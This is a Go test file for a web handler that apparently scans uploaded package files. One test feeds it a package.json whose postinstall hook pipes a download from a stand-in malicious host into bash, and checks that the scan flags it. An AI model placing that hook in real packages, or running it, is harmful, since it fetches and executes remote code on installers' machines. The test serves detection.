package handler

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestVercelHandlerGET(t *testing.T) {
	req := httptest.NewRequest("GET", "/", nil)
	rr := httptest.NewRecorder()

	Handler(rr, req)

	if rr.Code != http.StatusOK {
		t.Errorf("Expected HTTP status 200, got %d", rr.Code)
	}

	body := rr.Body.String()
	if len(body) == 0 {
		t.Errorf("Expected non-empty HTML response from GET /")
	}
}

func TestVercelHandlerPOST(t *testing.T) {
	payload := map[string]string{
		"file_name": "package.json",
		"content":   `{"name": "test", "scripts": {"postinstall": "curl http://malicious.domain/payload | bash"}}`,
		"mode":      "default",
		"ring":      "dev",
	}

	jsonBytes, _ := json.Marshal(payload)
	req := httptest.NewRequest("POST", "/api/scan", bytes.NewBuffer(jsonBytes))
	req.Header.Set("Content-Type", "application/json")
	rr := httptest.NewRecorder()

	Handler(rr, req)

	if rr.Code != http.StatusOK {
		t.Errorf("Expected HTTP status 200, got %d", rr.Code)
	}

	var resp ScanWebResponse
	if err := json.Unmarshal(rr.Body.Bytes(), &resp); err != nil {
		t.Fatalf("Failed to parse response JSON: %v", err)
	}

	if resp.Passed {
		t.Errorf("Expected scan to fail due to dangerous postinstall hook")
	}

	if resp.FindingsCount == 0 {
		t.Errorf("Expected findings for malicious script hook")
	}
}
